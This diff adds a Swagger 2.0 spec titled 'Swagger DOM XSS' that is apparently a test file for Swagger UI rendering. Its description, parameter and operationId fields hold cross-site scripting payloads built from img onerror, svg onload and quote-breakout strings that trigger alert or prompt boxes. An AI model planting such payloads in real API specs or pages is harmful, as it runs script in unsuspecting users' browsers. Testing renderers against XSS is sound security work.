@@ -1,0 +1,27 @@
+swagger: '2.0'
+info: 
+  title: Swagger DOM XSS
+  description: <img src=x onerror="alert('XSS')"><h2>XSS</h2>
+  version: production
+basePath: /
+produces:
+  - text/html
+consumes:
+  - text/html
+security:
+  - basicAuth: []
+paths:
+  '/xss.html':
+    get:
+      parameters:
+        - description: XSS<iframe>
+          type: string
+          in: \"><svg/onload=alert()>
+          default: \"><img src=x onerror=prompt()>
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: /xss.html\"><img>
+      summary: Finds groups by id
